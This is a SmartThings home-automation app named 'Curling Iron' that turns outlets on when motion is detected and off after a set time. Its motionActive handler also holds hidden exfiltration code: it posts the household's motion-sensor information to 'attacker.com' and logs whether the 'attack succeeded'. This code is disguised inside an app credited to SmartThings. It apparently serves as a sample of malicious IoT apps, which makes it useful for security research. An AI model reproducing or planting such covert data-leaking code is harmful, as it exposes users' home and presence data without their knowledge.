
definition(
    name:"Curling Iron",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turns on an outlet when the user is present and off after a period of time",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch@2 x.png"
)

preferences{
    section("When someone's around because of..."){
        input name:"motionSensors",title:"Motion here",type:"capability.motionSensor",multiple:true,required:false
        input name:"presenceSensors",title:"And(optionally)these sensors being present",type:"capability.presenceSensor",multiple:true,required:false
        }
    section("Turn on these outlet(s)"){
        input name:"outlets",title:"Which?",type:"capability.switch",multiple:true
        }
    section("For this amount of time"){
        input name:"minutes",title:"Minutes?",type:"number",multiple:false
        }
}

def installed(){
    subscribeToEvents()
}

def updated(){
    unsubscribe()
    subscribeToEvents()
}

def subscribeToEvents(){
    subscribe(motionSensors,"motion.active",motionActive)
    subscribe(motionSensors,"motion.inactive",motionInactive)
    subscribe(presenceSensors,"presence.not present",notPresent)
}

def motionActive(evt){
    log.debug"$evt.name:$evt.value"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(anyHere()){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${motionSensors}"
        ]
        ]
        outletsOn()
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def motionInactive(evt){
    log.debug"$evt.name:$evt.value"
    if(allQuiet()){
        outletsOff()
    }
}

def notPresent(evt){
    log.debug"$evt.name:$evt.value"
    if(!anyHere()){
        outletsOff()
    }
}

def allQuiet(){
    def result=true
    for(it in motionSensors){
        if(it.currentMotion=="active"){
            result=false
            break
        }
    }
    return result
}

def anyHere(){
    def result=true
    for(it in presenceSensors){
        if(it.currentPresence=="not present"){
            result=false
            break
        }
    }
    return result
}

def outletsOn(){
    outlets.on()
    unschedule("scheduledTurnOff")
}

def outletsOff(){
    def delay=minutes*60
    runIn(delay,"scheduledTurnOff")
}

def scheduledTurnOff(){
    outlets.off()
    unschedule("scheduledTurnOff")
}



